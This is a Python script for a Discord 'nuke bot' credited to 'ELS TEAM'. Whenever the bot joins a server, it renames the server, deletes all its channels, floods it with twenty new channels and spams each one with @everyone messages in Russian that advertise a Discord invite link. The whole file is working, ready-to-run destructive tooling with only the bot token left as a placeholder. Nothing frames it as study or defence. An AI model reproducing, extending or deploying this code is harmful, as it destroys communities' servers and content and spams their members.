import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="?", intents=intents)

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Game("NUKE  BOT  ^^"))

@bot.event
async def on_guild_join(guild):
    await guild.edit(name="NUKED BY ELS TEAM")

    channels_to_delete = guild.channels
    for channel in channels_to_delete:
        try:
            await channel.delete()
        except:
            pass

    channels_to_create = [f'by-elsteam' for i in range(20)]
    channels_creation_tasks = [guild.create_text_channel(name) for name in channels_to_create]
    await asyncio.gather(*channels_creation_tasks)

@bot.event
async def on_guild_channel_create(channel):
    counter = 0
    while counter < 5:
        await channel.send('**@everyone СРОЧНЫЙ ПЕРЕЕЗД:**\nhttps://discord.gg/URP9bzRTSV')
        counter += 1
        await asyncio.sleep(0.5)

bot.run("сюда токен")
